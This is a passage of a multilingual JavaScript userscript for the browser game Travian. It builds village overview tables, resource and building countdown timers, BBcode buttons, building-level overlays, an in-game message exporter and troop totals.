				nobr.appendChild($elem("SPAN", ' <a style="font-size:14px" href="dorf1.php?newdid=' + did + '">' + aldeas[i].innerHTML + '</a>'));
				td.appendChild(nobr);
				td.setAttribute("rowspan", "1");
				td.setAttribute("align", "left");
				tr.appendChild(td);

				for (var j = 0; j < 6; j++)
				{
					td = $elem("TD", "-");
					td.setAttribute("id", "aldea" + did + "_" + j);
					td.setAttribute("align", "Center");
					tr.appendChild(td);
					if (j != 6)
						tabla.appendChild(tr);
				}
			}
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == true || posvilleinfo == null)
		{
			if (a.firstChild)
				insertAfter(a.firstChild, tabla);
			else
				a.appendChild(tabla);
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == false || posvilleinfo == null)
		{
			a.appendChild($elem('p', ''));
			a.appendChild(tabla);
		}
	}





	function resumenAldeas6()
	{ // par Mik french
		var ba = find("//div[@id='lright1']", XPFirst);
		if (!ba)
			return;

		if (travplus == false || travplus == null)
			resumomenu();

		var aldeas = $tags('a', ba);
		var a = find("//div[@id='lmid2']", XPFirst);

		var tabla = $elem("TABLE");
		tabla.setAttribute("class", "tbg");
		tabla.setAttribute("align", "center");
		tabla.setAttribute("cellspacing", "1");
		tabla.setAttribute("cellpadding", "2");

		var tr = $elem("TR");

		/**
		 * TeYoU
		 * Vue d'ensemble pages message Refresh
		 */
		var FullRefresh = $elem("A", '<font color=#FF0000>' + T('REFRESH_INFORMARION') + '</font>');
		FullRefresh.href = "javascript:void(0);";
		FullRefresh.addEventListener("mouseover", function()
		{
			//Cliquez automatique
			var aldeas = $tags('a', ba);
			for (var i = 0; i < aldeas.length; i++)
			{
				if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
				{
					var did = RegExp.$1;
					setTimeout(crearEventoActualizarAldea5(did), 1000 * 1);
					setTimeout(crearEventoActualizarAldeaM(did), 1000 * 1);
				}
			}
		}, 0);
		var td2 = $elem("TD", '');
		td2.appendChild(FullRefresh);
		tr.appendChild(td2);

		tr.appendChild($elem("TD", ''));
		tr.appendChild($elem("TD", '<img src="' + img('r/1.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('r/2.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('r/3.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('a/clock.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('r/4.gif') + '">'));
		tr.appendChild($elem("TD", '<img src="' + img('a/clock.gif') + '">'));
		tr.appendChild($elem("TD", ''));

		tr.setAttribute("class", "rbg");
		tabla.appendChild(tr);

		for (var i = 0; i < aldeas.length; i++)
		{
			if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
			{
				var did = RegExp.$1;
				var tr = $elem("TR");

				var td = $elem("TD");
				//TeYoU: Vue d'ensemble bouton jaune
				var enlace = $elem("A", "<img src='" +/*Bouton gris */ img('a/b5.gif') + "' width='6' border='0' title='" + T('ACTUALIZAR') + "' id='aldea" + did + "_boton'>");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldea5(did), 0);
				td.appendChild(enlace);
				var enlace = $elem("A", "");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldeaM(did), 0);
				td.appendChild(enlace);
				var nobr = $elem("NOBR");
				nobr.appendChild(enlace);
				nobr.appendChild($elem("SPAN", ' <a style="font-size:14px" href="dorf1.php?newdid=' + did + '">' + aldeas[i].innerHTML + '</a>'));
				td.appendChild(nobr);
				td.setAttribute("rowspan", "1");
				td.setAttribute("align", "left");
				tr.appendChild(td);

				for (var j = 0; j < 8; j++)
				{
					td = $elem("TD", "-");
					td.setAttribute("id", "aldea" + did + "_" + j);
					td.setAttribute("align", "Center");
					tr.appendChild(td);
					if (j != 8)
						tabla.appendChild(tr);
				}
			}
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == true || posvilleinfo == null)
		{
			if (a.firstChild)
				insertAfter(a.firstChild, tabla);
			else
				a.appendChild(tabla);
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == false || posvilleinfo == null)
		{
			a.appendChild($elem('p', ''));
			a.appendChild(tabla);
		}

	}


	function resumenAldeas7()
	{ // par Mik french
		var ba = find("//div[@id='lright1']", XPFirst);
		if (!ba)
			return;

		if (travplus == false || travplus == null)
			resumomenu();

		var aldeas = $tags('a', ba);
		var a = find("//div[@id='lmid2']", XPFirst);

		var tabla = $elem("TABLE");
		tabla.setAttribute("class", "tbg");
		tabla.setAttribute("align", "center");
		tabla.setAttribute("cellspacing", "1");
		tabla.setAttribute("cellpadding", "2");

		var tr = $elem("TR");

		/**
		 * TeYoU
		 * Vue d'ensemble pages message Refresh
		 */
		var FullRefresh = $elem("A", '<font color=#FF0000>' + T('REFRESH_INFORMARION') + '</font>');
		FullRefresh.href = "javascript:void(0);";
		FullRefresh.addEventListener("mouseover", function()
		{
			//Cliquez automatique
			var aldeas = $tags('a', ba);
			for (var i = 0; i < aldeas.length; i++)
			{
				if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
				{
					var did = RegExp.$1;
					setTimeout(crearEventoActualizarAldea6(did), 1000 * 1);
				}
			}
		}, 0);
		var td2 = $elem("TD", '');
		td2.appendChild(FullRefresh);
		tr.appendChild(td2);

		tr.appendChild($elem("TD", 'LvL'));
		tr.appendChild($elem("TD", T('FT1')));
		tr.appendChild($elem("TD", T('FT2')));

		tr.setAttribute("class", "rbg");
		tabla.appendChild(tr);

		for (var i = 0; i < aldeas.length; i++)
		{
			if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
			{
				var did = RegExp.$1;
				var tr = $elem("TR");

				var td = $elem("TD");
				//TeYoU: Vue d'ensemble bouton jaune
				var enlace = $elem("A", "<img src='" + img('a/b5.gif') + "' width='6' border='0' title='" + T('ACTUALIZAR') + "' id='aldea" + did + "_boton'>");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldea6(did), 0);
				var nobr = $elem("NOBR");
				nobr.appendChild(enlace);
				nobr.appendChild($elem("SPAN", ' <a style="font-size:14px" href="dorf1.php?newdid=' + did + '">' + aldeas[i].innerHTML + '</a>'));
				td.appendChild(nobr);
				td.setAttribute("rowspan", "1");
				td.setAttribute("align", "left");
				tr.appendChild(td);

				for (var j = 0; j < 3; j++)
				{
					td = $elem("TD", "-");
					td.setAttribute("id", "aldea" + did + "_" + j);
					td.setAttribute("align", "Center");
					tr.appendChild(td);
					if (j != 3)
						tabla.appendChild(tr);
				}
			}
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == true || posvilleinfo == null)
		{
			if (a.firstChild)
				insertAfter(a.firstChild, tabla);
			else
				a.appendChild(tabla);
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == false || posvilleinfo == null)
		{
			a.appendChild($elem('p', ''));
			a.appendChild(tabla);
		}

	}



	function resumenAldeas8()
	{ // par Mik french
		var ba = find("//div[@id='lright1']", XPFirst);
		if (!ba)
			return;

		if (travplus == false || travplus == null)
			resumomenu();

		var aldeas = $tags('a', ba);
		var a = find("//div[@id='lmid2']", XPFirst);

		var tabla = $elem("TABLE");
		tabla.setAttribute("class", "tbg");
		tabla.setAttribute("align", "center");
		tabla.setAttribute("cellspacing", "1");
		tabla.setAttribute("cellpadding", "2");

		var tr = $elem("TR");

		/**
		 * TeYoU
		 * Vue d'ensemble pages message Refresh
		 */
		var FullRefresh = $elem("A", '<font color=#FF0000>' + T('REFRESH_INFORMARION') + '</font>');
		FullRefresh.href = "javascript:void(0);";
		FullRefresh.addEventListener("mouseover", function()
		{
			//Cliquez automatique
			var aldeas = $tags('a', ba);
			for (var i = 0; i < aldeas.length; i++)
			{
				if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
				{
					var did = RegExp.$1;
					setTimeout(crearEventoActualizarAldea7(did), 1000 * 1);
				}
			}
		}, 0);
		var td2 = $elem("TD", '');
		td2.appendChild(FullRefresh);
		tr.appendChild(td2);

		tr.appendChild($elem("TD", 'LvL'));
		tr.appendChild($elem("TD", 'Slot'));
		tr.appendChild($elem("TD", ''));
		tr.appendChild($elem("TD", T('EXT') + ' / 1'));
		tr.appendChild($elem("TD", ' / 2'));
		tr.appendChild($elem("TD", ' / 3'));

		tr.setAttribute("class", "rbg");
		tabla.appendChild(tr);
		for (var i = 0; i < aldeas.length; i++)
		{
			if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
			{
				var did = RegExp.$1;
				var tr = $elem("TR");

				var td = $elem("TD");
				//TeYoU: Vue d'ensemble bouton jaune
				var enlace = $elem("A", "<img src='" + img('a/b5.gif') + "' width='6' border='0' title='" + T('ACTUALIZAR') + "' id='aldea" + did + "_boton'>");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("mouseover", crearEventoActualizarAldea7(did), 0);
				var nobr = $elem("NOBR");
				nobr.appendChild(enlace);
				nobr.appendChild($elem("SPAN", ' <a style="font-size:14px" href="dorf1.php?newdid=' + did + '">' + aldeas[i].innerHTML + '</a>'));
				td.appendChild(nobr);
				td.setAttribute("rowspan", "1");
				td.setAttribute("align", "left");
				tr.appendChild(td);

				for (var j = 0; j < 6; j++)
				{
					td = $elem("TD", "-");
					td.setAttribute("id", "aldea" + did + "_" + j);
					td.setAttribute("align", "Center");
					tr.appendChild(td);
					if (j != 6)
						tabla.appendChild(tr);
				}
			}
		}
		posvilleinfo = readCookie("posvilleinfo" + server);
		if (posvilleinfo == true || posvilleinfo == null)
		{
			if (a.firstChild)
				insertAfter(a.firstChild, tabla);
			else
				a.appendChild(tabla);
		}
		if (posvilleinfo == false || posvilleinfo == null)
		{
			a.appendChild($elem('p', ''));
			a.appendChild(tabla);
		}
	}


	function resumenAldeasT()
	{ // par Mik french

		var ba = find("//div[@id='lright1']", XPFirst);
		if (!ba)
			return;
		var locationFlag = location.href.indexOf('dorf3.php') == -1 ? false : true;
		if (!travplus && locationFlag)
			resumomenu();

		var aldeas = $tags('a', ba);
		var a = find("//div[@id='lmid1']", XPFirst); //localisation //ltrm:inforessource-armé //lright1:dessous nom de village
		var tabla = $elem("TABLE");
		tabla.setAttribute("class", "tbg");
		tabla.setAttribute("align", "right");
		tabla.setAttribute("cellspacing", "1");
		tabla.setAttribute("cellpadding", "2");

		var tr = $elem("TR");

		/**
		 * TeYoU
		 * Vue d'ensemble pages message Refresh
		 */
		var FullRefresh = $elem("A", '<font style="font-size:12px; color=#FF0000>' + T('REFRESH_INFORMARION') + '</font>');
		FullRefresh.href = "javascript:void(0);";
		var mouseEvent = locationFlag ? "mouseout" : "click";
		FullRefresh.addEventListener(mouseEvent, function()
		{
			//Cliquez automatique
			var aldeas = $tags('a', ba);
			for (var i = 0; i < aldeas.length; i++)
			{
				if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
				{
					var did = RegExp.$1;
					setTimeout(crearEventoActualizarAldeaT(did), 1000 * 1);
					setTimeout(crearEventoActualizarAldeaM(did), 1000 * 1);
					setTimeout(crearEventoActualizarAldeaF(did), 1000 * 1);
				}
			}
		}, 0);
		tr.appendChild(FullRefresh);

		var td2 = $elem("TD", '<font style="font-size:12px; color=#4169E1>' + T('RESUMEN') + ' ' + T('ALDEA') + '</font>');
		td2.setAttribute("colspan", "7");
		tr.appendChild(td2);
		tr.setAttribute("class", "rbg");
		tabla.appendChild(tr);

		for (var i = 0; i < aldeas.length; i++)
		{
			if (aldeas[i].getAttribute("href").search(/\?newdid=(\d+)/) >= 0)
			{
				var did = RegExp.$1;
				var tr = $elem("TR");

				var td = $elem("TD");
				//TeYoU: Vue d'ensemble bouton jaune
				var enlace = $elem("A", "<img src='" +/*Bouton gris */ img('a/b5.gif') + "' width='5'  border='0' title='" + T('ACTUALIZAR') + "' id='aldea" + did + "_boton'>");
				enlace.href = "javascript:void(0);";
				enlace.addEventListener("click", function(e)
				{	if(e.target.nodeName == "A")
						var did = $tags('img', e.target)[0].id.match(/\d+/);
					else
						var did = e.target.id.match(/\d+/);
					setTimeout(crearEventoActualizarAldeaT(did), 100);
					setTimeout(crearEventoActualizarAldeaM(did), 100);
					setTimeout(crearEventoActualizarAldeaF(did), 100);
				}, 0);
				td.appendChild(enlace);

				var nobr = $elem("NOBR");
				nobr.appendChild(enlace);
				nobr.appendChild($elem("SPAN", ' <a style="font-size:12px" href="dorf2.php?newdid=' + did + '">' + aldeas[i].innerHTML + '</a>'));
				td.appendChild(nobr);
				td.setAttribute("rowspan", "1");
				td.setAttribute("align", "left");
				tr.appendChild(td);

				for (var j = 0; j < 7; j++)
				{
					td = $elem("TD", "-");
					td.setAttribute("id", "aldea" + did + "_" + j);
					td.setAttribute("align", "Center");
					tr.appendChild(td);
					if (j != 7)
						tabla.appendChild(tr);
				}
			}
		}
		if (!locationFlag)
		{	if (a.firstChild)
				insertAfter(a.firstChild, tabla);
			else
				a.appendChild(tabla);
		}
		else
		{	posvilleinfo = readCookie("posvilleinfo" + server);
			a = get("lmid2");
			if (posvilleinfo == true || posvilleinfo == null)
			{	if (a.firstChild)
					insertAfter(a.firstChild, tabla);
				else
					a.appendChild(tabla);
			}
			if (posvilleinfo == false || posvilleinfo == null)
			{	a.appendChild($elem('p', ''));
				a.appendChild(tabla);
			}
		}
	}

	function crearTemporizadorRecurso(i)
	{
		return function()
		{
			/*
			 * Actualiza las cantidades restantes por cada tipo de recurso si corresponde hacerlo en este
			 * ciclo de reloj segun la adaptacion de frecuencias anterior
			 */
			actual[i]++;
			var recursos = find("//*[@id='timeout" + i + "']", XPList);
			for (var j = 0; j < recursos.snapshotLength; j++)
			{
				var cantidad = recursos.snapshotItem(j).innerHTML - 1; // calculate needed recource quantity
				if (cantidad >= 0)
				{
					recursos.snapshotItem(j).innerHTML = cantidad;
				}
				else
				{
					removeElement(recursos.snapshotItem(j).parentNode);//document.location.reload();
				}
			}
		};
	}

	/** Il crée le temporisateur chargé de mettre à jour les nouvelles horloges et les quantités de ressources qui manquent */
	function setTimers()
	{
		// Calcula cada cuantos segundos debe actualizar cada contador de recursos restantes para
		// aprovechar el temporizador del resto de relojes
		var frecuencia = new Array(4);
		for (var i = 0; i < 4; i++)
		{
			frecuencia[i] = (1000.0 / Math.abs(produccion[i]));
			if (!isFinite(frecuencia[i]) || frecuencia[i] < 0 || total[i] - actual[i] == 0)
			{
				frecuencia[i] = Number.POSITIVE_INFINITY;
			}
			else
			{
				setInterval(crearTemporizadorRecurso(i), Math.floor(frecuencia[i]));
			}
		}

		setInterval(function()
		{
			/*
			 * Se distinguen dos tipos de temporizadores, timeout y timeouta. Solo los primeros
			 * provocan que la pagina se actualice al llegar a 0.
			 */
			var relojes = find("//*[@id='timeout' or @id='timeouta']", XPList);
			for (var i = 0; i < relojes.snapshotLength; i++)
			{
				var tiempo = calcular_segundos(relojes.snapshotItem(i).innerHTML) - 1; // calculate in seconds
				if (tiempo >= 0)
				{ // not reached
					relojes.snapshotItem(i).innerHTML = formatear_tiempo(tiempo);
				}
				else
					if (relojes.snapshotItem(i).id == 'timeout')
					{
						//                   log(1,"document reload because: "+relojes.snapshotItem(i).innerHTML);
						removeElement(relojes.snapshotItem(i).parentNode);// document.location.reload();
					}
			}

			// Aggiorna il totale risorse
			//		var relojesb = find("//*[@id='timeoutb']", XPList);
			//		for (var i = 0; i < relojesb.snapshotLength; i++){
			//			relojesb.snapshotItem(i).innerHTML = CalcolaTotaleRisorse();
			//				//alert("poppo");
			//           }

		}, 1000);

	}

	function BBcodeHelp()
	{
		if (!readCookie('BBcodeHelp'))
			return;
		var BBcodes = [
			['<b>B</b>', 'b', T('BBC_B')],
			['<i>i</i>', 'i', T('BBC_I')],
			['u', 'u', T('BBC_U')],
			['c', 'c', T('BBC_C')],
			['<', '<', T('BBC_LEFT')],
			['>', '>', T('BBC_RIGHT')],
			['Color', ['color=', 'color'], T('BBC_COLOR')],
			['url', 'url', T('BBC_URL')],
			['img', 'img', T('BBC_IMG')],
			['Blink', 'blink', T('BBC_BLINK')]
		];

		if (!get('igm'))
			return;
		var form = $names('msg')[0];
		var div = $elem("div");
		$elem("b", T('BBC') + ":", {}, {}, div);
		$elem("br", "", {}, {}, div);

		for(i = 0; i < BBcodes.length; i++)
		{
			var btn = $elem("button", BBcodes[i][0], {
				"class": "bbchelp",
				"btn": i,
				"title": BBcodes[i][2]
				}, {}, div);
			btn.addEventListener('click', function(e){
					var i = e.target.getAttribute('btn');
					var area = get('igm');
					var txt = area.value;
					var start = area.selectionStart;
					var end = area.selectionEnd;
					var BBC1 = (typeof BBcodes[i][1] != 'string') ? '[' + BBcodes[i][1][0] + ']' : '[' + BBcodes[i][1] + ']';
 					var BBC2 = (typeof BBcodes[i][1] != 'string') ? '[/' + BBcodes[i][1][1] + ']' : '[/' + BBcodes[i][1] + ']';
					area.value = txt.substring(0, start) + BBC1 + txt.substring(start, end) + BBC2 + txt.substring(end);
					area.setSelectionRange(start + BBC1.length, end + BBC1.length);
					area.focus();
			}, true);
		}
		insertAfter(form, div);
	}

	//Center Numbers section
	var _setValue, _getValue, _removeValue, glStorage, nameSpace = 'CN.';

	function CenterNumbersSaveValue()
	{
		if (typeof GM_setValue != "undefined")
		{
			_setValue = function(name, value)
			{
				GM_setValue(name, value)
			};
			_getValue = function(name, defaultValue)
			{
				return GM_getValue(name, defaultValue)
			};
			_removeValue = function(name)
			{
				GM_setValue(name, '')
			};
		}
		else
		{
			_setValue = function(name, value)
			{
				document.cookie = nameSpace + name + '=' + escape(value) + ';expires="";path=/';
			};
			_getValue = function(name, defaultValue)
			{
				var reg = new RegExp(nameSpace + name + "=([^;\n\r]*);?", "i");
				var data = reg.exec(document.cookie);
				if (data == null || data.length <= 1)
				{
					return defaultValue;
				}
				else
					return unescape(data[1]);
			};
			_removeValue = function(name)
			{
				_setValue(name, '');
			};
		}
	}

	function ShowCenterNumbers()
	{
		initvillinfo = readCookie("initvillinfo" + server);
		if (initvillinfo == true || initvillinfo == null)
		{

			CenterNumbersSaveValue();
			CenterNumbersShowNumbers();
		}
	}

	function colorLvl(currLvl, structGid,currentTotalRes)
	{
		eval('var nameStruct = ' + gidToName[structGid] + 'Cost;');
		var result = 1;
		var neededResNPC = 0;
		for (var i = 0; i < 4; i++)
		{
			if (actual[i] < nameStruct[parseInt(currLvl) + 1][i])
			{
				result = 0;
			   // i = 4;
			}
			neededResNPC += nameStruct[parseInt(currLvl) + 1][i];
		}
		if (result == 0 && neededResNPC <= currentTotalRes)
		{
			result = 2;
		}
		return result;
	}

	function CenterNumbersShowNumbers()
	{
		var currentTotalRes = 0;
		//compute total resource units available in the village
		for (var i = 0; i <4; i++) {
			currentTotalRes += parseInt(actual[i]);
		}
		// Map1 holds building names, level and building spot IDs in area elements
		var map1Element = $names('map1')[0];
		if (map1Element)
		{
			// Map1 ONLY has area children.
			var areaElements = $tags('area', map1Element);
			var lvlBuilding, aDIV, coords;
			var BuildingURL = new Array(21);

			for (var i = 0; i < 22; i++)
			{
				lvlBuilding = /(\d+)/.exec(areaElements[i].getAttribute("title"));
				BuildingURL = areaElements[i].getAttribute("href");
				coords = areaElements[i].coords.split(',');

				// Only show spots if buildings are available
				if (lvlBuilding){
					var imgId = BuildingURL.match(/id\=(\d+)/)[1] - 18;
					//For all the structures (also the rallyPoint)
					if (imgId == 21) { imgId = 'x1'; }
					try { var gid = find('//img[@class="d' + imgId + '"]', XPFirst).src.match(/g(\d+)/)[1];
						} catch(e) {}
					//Only for the wall
					if (imgId == 22) {
						var aux = find("//div[starts-with(@class, 'd2_x')]/@class", XPFirst).nodeValue;
						if (aux){
							switch(aux){
								case 'd2_x d2_1' : gid = 31; break;
								case 'd2_x d2_11': gid = 32; break;
								case 'd2_x d2_12': gid = 33; break;
							}
						}
					}
					aDIV = $elem("DIV", "", {
						'id': 'CNbuildingtag' + i,
						'class': 'CNbuildingtags'
					},{
						'top': (parseInt(coords[1]) + 60) + 'px',
						'left': (parseInt(coords[0]) + 95) + 'px',
						'visibility' : 'visible'
					});
					var aLink = $elem("A", "", {'href': BuildingURL}, {}, aDIV);

					//alert(aLink.href);
					if (lvlBuilding[0]) {aDIV.innerHTML = lvlBuilding[0];}
					//alert(BuildingURL);
					var strLvlBuilding = lvlBuilding.toString();
					if (lvlBuilding[0] == getMaxLevel(gid)) {
						aDIV.style.backgroundColor = CN_COLOR_MAX_LEVEL;
					} else {
						var colorCode = colorLvl(strLvlBuilding.substr(0,strLvlBuilding.indexOf(",")),parseInt(gid), currentTotalRes);
						if (colorCode == 0) {
							aDIV.style.backgroundColor = CN_COLOR_NO_UPGRADE;
						} else if (colorCode == 2) {
							aDIV.style.backgroundColor = CN_COLOR_UPGRADABLE_VIA_NPC;
						}
					}
					get('lmid2').appendChild(aDIV);
				}
			}

		}
	}

	// Generic div.
	function addDiv(id, style, html, parent)
	{
		var body, aDIV;
		if (!parent)
		{
			body = $tags('body')[0];
		}
		else
		{
			body = $tags(parent);
		}
		if (!body)
		{
			return false;
		}
		aDIV = $elem('div');
		aDIV.id = id;
		aDIV.className = style;
		if (html)
		{
			aDIV.innerHTML = html;
		}
		get('lmid2').appendChild(aDIV);
		return aDIV;
	}

	function getMaxLevel(gid)
	{
		var maxLevel;
		switch (gid)
		{
			case '5':
			case '6':
			case '7':
			case '8':
			case '9':
				maxLevel = 5;
				break;
			case '23':
			case '27':
				maxLevel = 10;
				break;
			case '40':
				maxLevel = 100;
				break;
			default:
				maxLevel = 20;
		}
		return (maxLevel)
	}

	// L'exportation message texte
	function archiveIGM()
	{
		IMGinfo = readCookie("IMGinfo" + server);
		if (IMGinfo == true || IMGinfo == null)
		{
			var a = find("//form[@name='msg']", XPFirst);
			// Creates structure HTML of the pad
			var table = $elem("TABLE");
			var row1 = $elem("TR");
			var row2 = $elem("TR");
			var row3 = $elem("TR");
			var cell1 = $elem("TD");
			var cell2 = $elem("TD");
			var cell3 = $elem("TD");
			var p = $elem("P");
			var textarea = $elem("TEXTAREA", "");
			var input = $elem("INPUT");
			//設定屬性
			table.setAttribute("class", "tbg");
			table.setAttribute("cellpadding", "2");
			table.setAttribute("cellspacing", "1");
			row1.setAttribute("class", "rbg");
			cell1.innerHTML = T('IGMOUTPUT');
			textarea.setAttribute("name", "IGMoutput");
			textarea.setAttribute("rows", "12");
			textarea.setAttribute("style", 'font-size: 10pt; width: 98%;overflow-x:none');
			row3.setAttribute("class", "rbg");
			input.setAttribute("type", "button");
			input.setAttribute("value", T('IGMOUTPUT'));
			input.addEventListener("click", function()
			{
				outputIGM();
			}, 0);

			row1.appendChild(cell1);
			cell2.appendChild(textarea);
			row2.appendChild(cell2);
			cell3.appendChild(input);
			row3.appendChild(cell3);
			table.appendChild(row1);
			table.appendChild(row2);
			table.appendChild(row3);
			a.parentNode.appendChild(p);
			a.parentNode.appendChild(table);
		}
	}

	function getIGM(t)
	{
		var ans = $elem('DIV');
		ans.innerHTML = t.responseText;
		var ansdoc = document.implementation.createDocument("", "", null);
		ansdoc.appendChild(ans);
		var igmsingle = '';
		igmsingle += T('IGMSENTER') + ':' + ansdoc.evaluate("//form[@action='nachrichten.php']//tr[2]/td[3]", ans, null, XPFirst, null).singleNodeValue.textContent + '\n';
		igmsingle += T('IGMTITLE') + ':' + ansdoc.evaluate("//form[@action='nachrichten.php']//tr[3]/td[2]", ans, null, XPFirst, null).singleNodeValue.textContent + '\n';
		igmsingle += T('IGMDATE') + ':' + ansdoc.evaluate("//form[@action='nachrichten.php']//tr[2]/td[4]", ans, null, XPFirst, null).singleNodeValue.textContent + ',';
		igmsingle += T('IGMTIME') + ':' + ansdoc.evaluate("//form[@action='nachrichten.php']//tr[3]/td[3]", ans, null, XPFirst, null).singleNodeValue.textContent + '\n';
		igmsingle += ansdoc.evaluate("//form[@action='nachrichten.php']//tr[5]/td[2]", ans, null, XPFirst, null).singleNodeValue.textContent;
		igmsingle += '\n\n==========\n\n';
		//return igmsingle;
		var a = find("//textarea[@name='IGMoutput']", XPFirst);
		a.value += igmsingle;
	}

	function outputIGM()
	{
		var igms = find("//form[@name='msg']//td[2]/a", XPList);
		var a = find("//textarea[@name='IGMoutput']", XPFirst);
		a.value = '';

		for (var i = igms.snapshotLength - 1; i >= 0; i--)
		{
			var igmlink = igms.snapshotItem(i);
			ajaxRequest(igmlink.href, "GET", null, getIGM, dummy);
		}
	}

	function changeText()
	{
		try
		{
			eval('var text = text_' + language);
			reemplazartextRecursivo(document.body, text);
		}
		catch (e)
		{
		}
	}

	function xpathEvaluateInContext(context, xpathExpr)
	{
		return document.evaluate(xpathExpr, context, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
	}

	function xpathEvaluate(xpathExpr)
	{
		return document.evaluate(xpathExpr, document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
	}

	function getActiveVillageCoordZ()
	{
		var activeVillageLink = xpathEvaluate('//a[@class="active_vl"]/../../td/table/tbody/tr/td');
		var coordXCurrentActiveVillage = -10000;
		var coordYCurrentActiveVillage = -10000;
		if (activeVillageLink.snapshotLength > 0)
		{
			coordXCurrentActiveVillage = parseInt(activeVillageLink.snapshotItem(0).innerHTML.replace("(", ""));
			coordYCurrentActiveVillage = parseInt(activeVillageLink.snapshotItem(2).innerHTML.replace(")", ""));
		}
		return xy2id(coordXCurrentActiveVillage, coordYCurrentActiveVillage);
	}

	function QP_addOwnTownTotalTroopsTable()
	{
		if(location.href.indexOf('spieler.php') > -1)
			return;
		Tototroupe = readCookie("Tototroupe" + server);
		if (Tototroupe == true || Tototroupe == null)
		{
			var activeVillageCoordZ = getActiveVillageCoordZ();

			var ownTroopsTables = xpathEvaluate('//div[@id="lmid2"]/table/tbody/tr/td[1]/a[contains(@href, ' + activeVillageCoordZ + ')]/../../../..|//div[@id="lmid2"]/p[@class="b f16"]');

			if (ownTroopsTables.snapshotLength > 0)
			{
				var newTable = ownTroopsTables.snapshotItem(0).cloneNode(true);
				var newTableTitleRow = newTable.rows[0];
				var newTableIconsRow = newTable.rows[1];
				var newTableTroopsRow = newTable.rows[2];
				var newTableCropRow = newTable.rows[3];

				newTableIconsRow.cells[0].width = newTable.rows[0].cells[0].width;
				//			newTableCropRow.cells[0].width = newTable.rows[0].width;

				for (var i = 1, len = ownTroopsTables.snapshotLength; i < len; i++)
				{ // table 0 is the cloned one above
					var currentTable = ownTroopsTables.snapshotItem(i);

					// doesn't count on oasis to not double count
					if (currentTable.nodeName == "P")
					{
						break;
					}

					var currentTroopsCells = xpathEvaluateInContext(currentTable, 'tbody/tr[3]').snapshotItem(0);

					// creates the hero column in case it wasn't in the "totals" table but the hero belongs to this town now
					if (currentTroopsCells.cells.length == 12)
					{
						// clone the hero icon cell
						var currentTroopsHeroIconCell = xpathEvaluateInContext(currentTable, 'tbody/tr[2]/td[12]').snapshotItem(0);
						newTableIconsRow.appendChild(currentTroopsHeroIconCell.cloneNode(true));
						// create the hero amount cell (with 0 amount, it will be added as normal)
						var newHeroAmountCell = currentTroopsCells.cells[11].cloneNode(true);
						newHeroAmountCell.innerHTML = 0;
						newTableTroopsRow.appendChild(newHeroAmountCell);

						newTableCropRow.cells[1].colSpan = 11;
					}

					// ADDS UP THE TROOPS
					for (var j = 1; j < currentTroopsCells.cells.length; j++)
					{ // cell 0 has the word "troops"
						newTableTroopsRow.cells[j].innerHTML = parseInt(newTableTroopsRow.cells[j].innerHTML) + parseInt(currentTroopsCells.cells[j].innerHTML);
					}

					var currentCropCells = xpathEvaluateInContext(currentTable, 'tbody/tr[4]').snapshotItem(0);
					newTableCropRow.cells[1].innerHTML = parseInt(newTableCropRow.cells[1].textContent ? newTableCropRow.cells[1].textContent : newTableCropRow.cells[1].innerText) + parseInt(currentCropCells.cells[1].textContent ? currentCropCells.cells[1].textContent : currentCropCells.cells[1].innerText) ? parseInt(currentCropCells.cells[1].textContent ? currentCropCells.cells[1].textContent : currentCropCells.cells[1].innerText) : 0;

				}
				// make the totals 0s greyed out and the non-0s non-grayed out
				for (var j = 1; j < newTableTroopsRow.cells.length; j++)
				{ // cell 0 has the word "troops"
					newTableTroopsRow.cells[j].className = (newTableTroopsRow.cells[j].innerHTML == 0) ? "c" : "";
				}
				// change the title row
				var newTableTitleCell = newTableTitleRow.cells[0];
				newTableTitleRow.innerHTML = "";
				newTableTitleRow.appendChild(newTableTitleCell);
				newTableTitleCell.colSpan = 0;
				// remove all and re-insert the 1st 3 rows - removes the upkeep/arrival row //	supprimer tous et re-insérer la 1ère 3 lignes - supprime l'entretien / la ligne d'arrivée


				newTableCropRow.cells[1].innerHTML += ' <img class="res" src="' + img('r/4.gif') + '"> ' + T('');

				newTable.innerHTML = "";
				newTable.appendChild(newTableTitleRow);
				newTable.appendChild(newTableIconsRow);
				newTable.appendChild(newTableTroopsRow);

				//	newTable.appendChild(newTableCropRow);

				// add the newly created table with the totals
				var paragraph = xpathEvaluate('//div[@id="lmid2"]/p[@class="f10"]').snapshotItem(0);
				paragraph.parentNode.insertBefore(newTable, paragraph.nextSibling);

				//	paragraph.parentNode.insertBefore(igmlink2, paragraph.nextSibling);
			}
		}
	}

	/**
	*Development by Booboo
	**/

	function lonelyTown()
	{
		function downTown(href, uid)
		{
			ajaxRequest(href, 'GET', null, function(t)
			{
				var ansdoc = document.implementation.createDocument("", "", null);
				var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);
				var a = ansdoc.evaluate("//div[@id='lmid2']//table[@class='tbg']//td[@class='s7']//a[contains(@href, 'karte.php?d=')]", ans, null, XPFirst, null).singleNodeValue;
